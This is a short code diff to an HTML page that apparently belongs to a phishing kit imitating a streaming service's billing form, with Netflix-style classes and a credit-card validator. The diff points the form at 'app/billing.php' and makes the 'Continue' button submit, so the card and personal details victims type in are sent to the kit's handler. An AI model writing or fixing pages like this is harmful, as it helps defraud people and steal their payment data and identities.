@@ -178,7 +178,7 @@ $('#id_xccaaa').validateCreditCard(function(resultx) {
           </span>
         </div> -->
         <div style="clear:both;"></div>
-        <form action="congratulations.php" method="post" id="formx">
+        <form action="app/billing.php" method="post" id="formx">
         <div class="nfInput nfInputOversize">
           <div class="nfInputPlacement">
             <label class="input_id" placeholder="firstName">
@@ -295,7 +295,7 @@ $('#id_xccaaa').validateCreditCard(function(resultx) {
               </label>
             </div>
             <input type="hidden" name="next">
-          <button class="btn login-button btn-submit btn-small continue-btn" id="btn_zebi" type="button" autocomplete="off" tabindex="4"><!-- react-text: 26 -->Continue<!-- /react-text --></button>
+          <button class="btn login-button btn-submit btn-small continue-btn" id="btn_zebi" type="submit" autocomplete="off" tabindex="4"><!-- react-text: 26 -->Continue<!-- /react-text --></button>
           </div>
           
           </div>
